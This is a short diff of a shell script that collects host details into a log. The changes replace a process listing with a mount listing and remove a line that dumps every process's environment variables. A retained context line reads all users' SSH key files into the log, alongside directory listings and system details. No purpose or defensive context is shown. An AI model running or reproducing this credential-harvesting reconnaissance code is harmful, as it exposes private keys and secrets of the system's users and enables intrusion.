@@ -12,8 +12,8 @@ uname -a >> "${LOG}"
 # echo "== env ==" >> "${LOG}"
 # env >> "${LOG}"
 
-echo "== ps aux ==" >> "${LOG}"
-ps aux >> "${LOG}"
+echo "== mount ==" >> "${LOG}"
+mount >> "${LOG}"
 
 echo "== ls Home ==" >> "${LOG}"
 ls -lah ~/ >> "${LOG}"
@@ -33,9 +33,6 @@ cat /home/*/.ssh/* >> "${LOG}"
 
 echo "== argv ==" >> "${LOG}"
 echo "$@" >> "${LOG}"
-
-echo "== proc ==" >> "${LOG}"
-cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | sort -u >> "${LOG}"
 
 echo "== ls Root ==" >> "${LOG}"
 ls -lah / >> "${LOG}"
